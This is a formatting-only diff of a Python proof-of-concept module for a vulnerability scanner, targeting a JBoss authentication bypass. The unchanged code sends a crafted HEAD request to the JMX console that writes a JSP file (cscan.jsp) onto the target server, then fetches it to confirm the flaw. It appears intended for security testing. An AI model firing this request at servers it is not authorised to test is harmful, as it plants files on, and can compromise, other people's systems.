@@ -8,29 +8,30 @@ import time
 import random
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'JBoss_0000' # 平台漏洞编号
-    name = 'JBoss 认证绕过' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    vuln_id = 'JBoss_0000'  # 平台漏洞编号
+    name = 'JBoss 认证绕过'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2014-09-12'  # 漏洞公布时间
     desc = '''
         通过Head请求可绕过Jboos的登陆认证，攻击者可通过此漏洞直接获取服务器权限。。
-    ''' # 漏洞描述
-    ref = 'https://access.redhat.com/solutions/30744' # 
-    cnvd_id = 'Unknown' # cnvd漏洞编号
+    '''  # 漏洞描述
+    ref = 'https://access.redhat.com/solutions/30744'
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = 'JBoss'  # 漏洞组件名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
-    poc_id = '70809fac-751e-4777-93ab-296546332bc6' # 平台 POC 编号
+    poc_id = '70809fac-751e-4777-93ab-296546332bc6'  # 平台 POC 编号
     author = '国光'  # POC编写者
-    create_date = '2018-06-01' # POC创建时间
+    create_date = '2018-06-01'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
-
 
     def verify(self):
         try:
@@ -49,13 +50,13 @@ class Poc(ABPoc):
             name = ""
             for i in range(5):
                 name += (random.choice("ABCDEFGH"))
-                
+
             for v in shell:
                 shellcode += hex(ord(v)).replace("0x", "%")
             flag = "HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=" + \
-               "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=cscan&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=" % (
-               name) + shellcode + \
-               "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
+                "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=cscan&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=" % (
+                   name) + shellcode + \
+                "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
             s1.send(flag)
             data = s1.recv(512)
             s1.close()
@@ -64,13 +65,15 @@ class Poc(ABPoc):
             webshell_url = arg + '/cscan.jsp'
             res = urllib2.urlopen(webshell_url, timeout=timeout)
             if 'cscantest' in res.read():
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
-            
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
